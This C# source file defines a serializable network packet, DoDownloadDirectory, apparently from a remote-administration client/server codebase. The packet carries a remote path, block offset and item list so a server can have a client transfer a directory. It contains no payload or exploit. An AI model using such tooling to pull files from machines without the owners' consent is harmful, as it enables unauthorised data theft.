using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    public enum DownloadType
    {
        Selective,
        Full
    }

    public enum ItemOption
    {
        None,
        Compress
    }

    [Serializable]
    public class DoDownloadDirectory : IPacket
    {
        public string RemotePath { get; set; }

        public int ID { get; set; }

        public int StartBlock { get; set; }

        public string[] Items { get; set; }
        public ItemOption[] ItemOptions { get; set; }

        public DownloadType Type { get; set; }


        public DoDownloadDirectory()
        {
        }

        public DoDownloadDirectory(string remotepath, int id, int startBlock, string[] items = null, ItemOption[] itemOptions = null, DownloadType type = DownloadType.Full)
        {
            this.RemotePath = remotepath;
            this.ID = id;
            this.StartBlock = startBlock;
            this.Items = items;
            this.Type = type;
            this.ItemOptions = itemOptions;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}